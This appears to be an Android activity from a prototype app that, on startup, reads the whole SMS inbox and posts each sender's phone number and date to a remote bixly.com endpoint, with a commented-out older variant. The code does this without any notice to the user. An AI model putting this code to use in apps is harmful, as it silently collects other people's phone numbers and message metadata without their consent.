package com.example.marcusg.texttoserver;

import android.app.DownloadManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;


public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        System.out.println("Started");
        System.out.println("After");
        //postNewComment(this);
        refreshSmsInbox(this);
    }

    public void refreshSmsInbox(Context context) {
        System.out.println("inside inbox");
        if(ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED) {
            ContentResolver contentResolver = getContentResolver();
            Cursor smsInboxCursor = contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null);
            int indexBody = smsInboxCursor.getColumnIndex("body");
            int indexAddress = smsInboxCursor.getColumnIndex("address");
            int indexDate = smsInboxCursor.getColumnIndex("date");
            if (indexBody < 0 || !smsInboxCursor.moveToFirst()) return;
            do {
                String str = "SMS From: " + smsInboxCursor.getString(indexAddress) +
                        "\n" + smsInboxCursor.getString(indexBody) + "\n";
                postNewComment(context, smsInboxCursor.getString(indexAddress), smsInboxCursor.getLong(indexDate));
            } while (smsInboxCursor.moveToNext());
        }
        else{
            System.out.println("no permission?");
        }
    }

    public static void postNewComment(Context context, final String address, final Long dateSend){
        RequestQueue queue = Volley.newRequestQueue(context);
//        StringRequest sr = new StringRequest(Request.Method.POST,"https://smamgg.bixly.com/incomingPOSTAndroid", new Response.Listener<String>() {
        //RequestQueue queue = Volley.newRequestQueue(context); 
//        String url = "https://smamgg.bixly.com/incomingPOSTAndroid";
        String url = "https://shoppinglist.bixly.com/incomingPOSTAndroid";

        StringRequest postRequest = new StringRequest(Request.Method.POST, url,
                new Response.Listener<String>()
                {
                    @Override
                    public void onResponse(String response) {
                        // response
                        Log.d("Response", response);
                    }
                },
                new Response.ErrorListener()
                {
                    @Override
                    public void onErrorResponse(VolleyError error) {
                        String body = "Empty Body";
                        //get status code here
                        String statusCode = String.valueOf(error.networkResponse.statusCode);
                        //get response body and parse with appropriate encoding
                        if(error.networkResponse.data!=null) {
                            try {
                                body = new String(error.networkResponse.data,"UTF-8");
                            } catch (UnsupportedEncodingException e) {
                                e.printStackTrace();
                            }
                        }
                        System.out.println("failure " + body);
                    }
                }
        ) {
            @Override
            protected Map<String, String> getParams()
            {
                String addr = address;
                Long date = dateSend;
                Map<String, String>  params = new HashMap<String, String>();
                params.put("addr", addr);
                params.put("date", String.valueOf(date));

                return params;
            }
        };
        queue.add(postRequest);

////        mPostCommentResponse.requestStarted();
//        RequestQueue queue = Volley.newRequestQueue(context);
//        StringRequest sr = new StringRequest(Request.Method.POST,"https://smamgg.bixly.com/incomingPOSTAndroid", new Response.Listener<String>() {
//            @Override
//            public void onResponse(String response) {
////                mPostCommentResponse.requestCompleted();
//                System.out.println("success" + response);
//            }
//        }, new Response.ErrorListener() {
//            @Override
//            public void onErrorResponse(VolleyError error) {
//                String body = "Empty Body";
//                //get status code here
//                String statusCode = String.valueOf(error.networkResponse.statusCode);
//                //get response body and parse with appropriate encoding
//                if(error.networkResponse.data!=null) {
//                    try {
//                        body = new String(error.networkResponse.data,"UTF-8");
//                    } catch (UnsupportedEncodingException e) {
//                        e.printStackTrace();
//                    }
//                }
//                System.out.println("failure " + body);
//            }
//        }){
//            @Override
//            protected Map<String,String> getParams(){
//                Map<String,String> params = new HashMap<String, String>();
//                params.put("user","user");
//                params.put("pass","pass");
//                return params;
//            }
//
//            @Override
//            public Map<String, String> getHeaders() throws AuthFailureError {
//                Map<String,String> params = new HashMap<String, String>();
//                params.put("Content-Type","application/x-www-form-urlencoded");
//                return params;
//            }
//        };
//        queue.add(sr);
    }

    public interface PostCommentResponseListener {
        public void requestStarted();
        public void requestCompleted();
        public void requestEndedWithError(VolleyError error);
    }
}

